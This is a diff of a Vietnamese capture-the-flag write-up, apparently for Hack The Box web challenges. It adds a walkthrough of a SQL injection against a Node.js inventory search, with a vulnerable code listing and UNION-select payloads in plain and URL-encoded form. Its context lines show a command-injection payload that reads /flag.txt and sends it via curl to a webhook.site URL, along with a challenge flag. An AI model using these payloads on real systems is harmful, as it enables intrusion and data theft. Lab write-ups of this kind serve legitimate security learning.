@@ -225,5 +225,52 @@ payloads:
 /flag.txt;KMA=$(cat</flag.txt);curl${IFS}https://webhook.site/<u_webhook_id>?kma=${KMA}
 
 flag: HTB{c0mm4nd_1nj3ct1on_15_3457_t0_f1nD!}
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________
+Unholy Union
+
+đầu tiên , mở chall ra , ta có 1 Inventory Manager cho phép nhập tên items và sẽ trả về thông tin của các item ấy
+web còn cho chúng ta sẵn 1 cửa sổ để ta có thể theo dõi trực tiếp user-input được đưa vào câu lệnh truy vấn ntn ,xuất kết quả / lỗi của câu lệnh sql với user-input
+ta vừa nhập
+ảnh :
+tiếp đến , khi mò vào file , chúng ta thấy user-input của ta đc đặt thẳng vào câu lệnh sql , k một chút filter :
+
+app.get("/search", async (req, res) => {
+  const query = req.query.query ? req.query.query : ""; //user input đc đưa vào biến này
+  let results = { status: null, message: null };
+
+  try {
+    let sqlQuery;
+
+    if (query === "") {
+      sqlQuery = "SELECT * FROM inventory";
+    } else {
+      sqlQuery = `SELECT * FROM inventory WHERE name LIKE '%${query}%'`; // đáp thẳng user-input vào câu lệnh sql luôn 
+    }
+
+    const [rows] = await pool.query(sqlQuery);
+    results.status = "success";
+    results.message = rows;
+  } catch (err) {
+    console.error("Error executing query:", err.stack);
+    results.status = "failed";
+    results.message = err.message;
+  }
+
+  return res.json(results);
+});
+
+==> sql injection
+tuy vậy , ta cần chú ý đến 
+1. phải encoding payload trc khi gửi,nếu k thì có thể sẽ gặp trường hợp ntn:
+ảnh: 
+ (do việc encoding các kí tự đặc biệt k chuẩn nên server-side k thể url decode đúng ra kí tự đó đc ->làm sai mục đích của payload)
+
+2. chú ý đến số cột được xuất ra mặc định khi ghép kết quả của 2 câu lệnh truy vấn (sử dụng union)để xuất ra cho phù hợp , tránh thừa thiếu cột dẫn đến việc lỗi
+
+payloads gốc: Plumbus%' union select flag,null,null,null,null from flag #
+payloads khi đc url encode: 
+Plumbus%25%27%20union%20select%20flag%2Cnull%2Cnull%2Cnull%2Cnull%20from%20flag%20%23
+hoặc
+%50%6c%75%6d%62%75%73%25%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%66%6c%61%67%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%20%66%72%6f%6d%20%66%6c%61%67%20%23
 
 
